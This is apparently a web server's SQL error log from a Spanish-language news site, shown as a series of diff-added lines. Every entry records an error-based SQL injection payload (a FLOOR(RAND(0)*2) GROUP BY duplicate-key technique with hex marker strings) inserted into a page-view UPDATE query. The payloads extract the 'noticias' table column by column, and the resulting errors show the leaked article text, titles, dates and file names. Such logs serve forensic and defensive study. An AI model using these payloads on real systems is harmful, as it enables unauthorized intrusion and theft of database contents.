+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1166 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo AS CHAR),0x20)),55,54) FROM delbd.noticias ORDER BY id LIMIT 499,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:34
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqrante el recorrido, la secretaria de estado y el mandaqjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 9763 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),379,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:34
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqvo Laredo, cuando personal militar realizaba reconocimqjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5876 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),217,54) FROM delbd.noticias ORDER BY id LIMIT 299,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:33
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqDos jóvenes mujeres participaran en las bodas colectivqjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 6455 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 499,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:33
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqmente el avance que llevan hasta el momento. 
+<p>
+Duqjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5877 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),325,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:33
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq200 de la carretera ribereña Nueva Ciudad Guerrero-Nueqjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 9557 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),163,54) FROM delbd.noticias ORDER BY id LIMIT 299,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:33
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5922 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen5 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 499,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:33
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqrnes 8 de enero del año en curso, en el kilómetro 155+qjz' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1867 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),109,54) FROM delbd.noticias ORDER BY id LIMIT 299,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:33
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqste populoso sector de la ciudad, constatando personalqjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 7779 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),271,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:32
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqs de rehabilitación y pavimentación de las calles de eqjz' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 7216 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),217,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:32
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 4904 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen4 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 499,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:32
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqmó que el ataque se registró a las 01:45 horas del vieqjz' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1987 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),55,54) FROM delbd.noticias ORDER BY id LIMIT 299,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:32
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq243qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2094 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(visitas AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 497,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:32
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2023 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen3 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 499,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:32
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqA través del Grupo de Coordinación Tamaulipas se inforqjz' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3017 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 299,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:32
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq se realizó un recorrido de supervisión de los trabajoqjz' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 9910 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),163,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:32
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5276 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(videotype AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 497,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:31
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq
+
+Un convoy con más de 15 integrantes de un grupo deqjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5645 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 299,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:31
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 6479 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen2 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 499,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:31
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqContreras y su esposa la señora Imelda Muñoz de Juradoqjz' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5472 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),109,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:31
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 8894 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(video AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 497,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:31
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqmundo2qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 9352 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(ubicacion AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 497,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:31
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 6754 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen5 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 299,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:31
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqbodas.JPGqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1389 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 499,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:31
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqs por el presidente municipal ingeniero Miguel Jurado qjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 8541 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),55,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:31
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq264qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 6454 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(visitas AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 298,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:31
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq3032qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2986 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(id AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 499,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:31
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqide seguir desconfiando de EUqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1884 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(titulo AS CHAR),0x20)),55,54) FROM delbd.noticias ORDER BY id LIMIT 497,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:31
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5627 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen4 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 299,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:31
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqPrevia al evento oficial, los funcionarios, acompañadoqjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 4244 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:30
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 7952 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(videotype AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 298,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:30
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqdeliciasqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 4116 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(clasificacion AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 499,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:30
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 7020 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen3 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 299,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:30
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqLíder supremo de Irán celebra fin de sanciones, pero pqjz' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2015 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(titulo AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 497,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:30
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqres de la Deportiva de la Emiliano Zapata. 
+.qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1647 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo AS CHAR),0x20)),163,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:30
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq230qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 8840 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(visitas AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 296,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:30
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3241 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(video AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 298,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:30
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 4589 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo5 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 497,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:30
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 8919 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(ciudad AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 499,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:30
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 4654 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen2 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 299,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:30
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq este martes por la tarde la iluminación y celdas solaqjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1472 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo AS CHAR),0x20)),109,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:30
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqnacionalprincipalqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 4801 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(ubicacion AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 298,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:30
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3523 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(videotype AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 296,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:29
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 8692 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo4 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 497,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:29
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqArresto de ‘El Chapo’ reafirma voluntad y Estado de deq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1007 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(titulo AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 298,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:29
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqtamau.jpgqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 7278 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 299,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:29
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq2016-01-19 21:44:08qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 4778 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(`date` AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 499,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:29
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1145 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(video AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 296,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:29
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq Gobernador del Estado César Duarte Jaques inauguraronqjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2279 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo AS CHAR),0x20)),55,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:29
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3037 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo3 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 497,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:29
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 7272 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo5 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 298,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:29
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq2831qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1753 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(id AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 299,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:29
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq276qjzjq1' for key 'group_key'
